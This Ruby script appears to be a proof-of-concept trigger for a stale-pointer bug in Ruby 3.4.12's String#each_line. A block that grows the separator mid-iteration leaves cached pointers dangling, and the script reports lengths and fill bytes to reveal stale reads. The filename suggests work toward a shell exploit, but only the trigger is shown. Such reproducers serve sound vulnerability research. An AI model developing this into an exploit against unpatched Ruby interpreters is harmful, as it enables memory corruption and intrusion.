# Adjacent Ruby 3.4.12 -> 3.4.13 string.c fix: rb_str_enumerate_lines
# caches rsptr/rslen (string.c:9510-9511, :9555) before calling the Ruby
# block with ENUM_ELEM (:9588).  It checks only the receiver for modification
# (str_mod_check(str, ptr, len) at :9589); 3.4.13 also checks the separator
# (str_mod_check(rs, rsptr, rslen)).  A block that grows the separator
# reallocates its buffer, leaving the cached pointer stale for the next
# rb_memsearch (:9570) and the tail memcmp (:9600).
#
# In-process experiment: no wire input, no debugger write, no marker, no
# ObjectSpace/maps read.  Usage:
#   ruby ruby2shell-eachline-stale-sep.rb
# Environment: W331L_ACTION=none|grow|shrink, W331L_SEP (initial separator
# length), W331L_GROW (grown separator length), W331L_FILL (grown byte).
Warning[:deprecated] = true

$sep_len = Integer(ENV.fetch('W331L_SEP', '64'))
$grow_len = Integer(ENV.fetch('W331L_GROW', '8192'))
$fill = Integer(ENV.fetch('W331L_FILL', '90')).chr
$action = ENV.fetch('W331L_ACTION', 'none')
$calls = 0
$sep = 'A' * $sep_len
$sep_after = nil

str = ('x' * 256) + $sep + ('y' * 256) + $sep + ('z' * 256)
begin
  lines = str.each_line($sep).map do |line|
    $calls += 1
    if $calls == 1 && $action != 'none'
      if $action == 'grow'
        $sep.replace($fill * $grow_len)
      else
        $sep.replace('B')
      end
      $sep_after = $sep.bytesize
    end
    line
  end
  puts "RESULT action=#{$action} calls=#{$calls} lines=#{lines.length} " \
       "sep0=#{$sep_len} sep_after=#{$sep_after || $sep_len} " \
       "lens=#{lines.map(&:bytesize).join(',')} " \
       "fill=#{lines.sum { |l| l.bytes.count($fill.ord) }}"
rescue => e
  puts "RESULT action=#{$action} calls=#{$calls} raised=#{e.class}: #{e.message}"
end
